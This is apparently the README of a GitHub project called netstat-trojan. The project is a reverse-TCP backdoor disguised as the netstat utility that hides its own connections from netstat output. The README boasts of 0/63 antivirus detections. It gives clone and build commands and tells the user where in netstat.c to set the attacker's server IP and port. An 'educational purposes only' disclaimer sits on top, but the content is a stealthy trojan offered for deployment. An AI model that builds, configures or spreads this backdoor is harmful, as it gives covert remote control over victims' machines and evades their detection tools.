```
            /********************************************************************\
           *                           DISCLAIMER:                            *
           *                                                                  *
           *  This program is for educational purposes only. Usage signifies  *
           *  understanding of risks. Usage on unauthorized systems is        *
           *  prohibited.                                                     *
           *                                                                  *
           *  - Use only with proper authorization. Unauthorized use is       *
           *    strictly prohibited.                                          *
           *                                                                  *
           *  - The creator assumes no liability for damages or legal         *
           *    consequences caused by this program.                          *
           *                                                                  *
           *  - Ensure compliance with applicable laws and regulations.       *
           *                                                                  *
           *  Use responsibly, ethically, and respect others' privacy and     *
           *  security.                                                       *
          \********************************************************************/
```


# netstat-trojan
**netstat-trojan** is a reverse-TCP backdoor disguised within the netstat utility. It's designed to automatically exclude itself from the netstat output. 

[VIRUS TOTAL RESULTS](https://www.virustotal.com/gui/file/7b2d7a27e5907cc3210ab57aa1dc376c0555acb96da29288ca700408e68dbc3d/detection) 0/63

## Setup

1. Clone the repository:
   ```bash
   git clone https://github.com/Drew-Alleman/netstat-trojan/
   ```
2. Navigate to the cloned directory:
   ```bash
   cd netstat-trojan/
   ```
3. Initialize the configuration scripts:
   ```bash
   ./autogen.sh
   ```
4. Run the configuration:
   ```bash
   ./configure
   ```

## Configuration Process
To configure the Netstat-Trojan to suit your specific needs, you will need to modify the `netstat.c` file:

1. Open `netstat.c` in your preferred text editor. For example, using `vim`:
   ```bash
   drew@ubuntu-desktop:~/Projects/netstat-trojan$ vim src/netstat.c
   ```
2. Locate and modify the following settings:

   - **Port Configuration**: Define the port to host the backdoor.
     ```c
     #define PORT 44566
     ```
   - **Server IP Configuration**: Set the attacking IP address or the server address that the backdoor will connect to.
     ```c
     #define SERVER_IP "192.168.0.87"
     ```

Ensure that you replace `PORT` and `SERVER_IP` with the values that align with your desired configuration.
